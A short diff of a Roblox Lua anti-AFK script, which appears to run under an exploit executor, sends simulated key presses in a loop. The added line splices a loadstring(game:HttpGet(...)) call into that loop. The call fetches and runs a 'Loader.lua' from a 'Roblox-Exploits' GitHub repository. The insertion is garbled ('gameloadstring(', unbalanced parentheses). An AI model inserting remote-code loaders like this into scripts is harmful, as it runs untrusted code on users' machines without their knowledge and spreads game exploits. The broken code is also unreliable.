@@ -113,7 +113,7 @@ if not iswindowactive() and not getgenv().WindowFocused then
 end
 
 while true do
-    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Unknown, false, game)
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Unknown, false, gameloadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
 
     task.wait(Random.new():NextNumber(15, 120))
 end
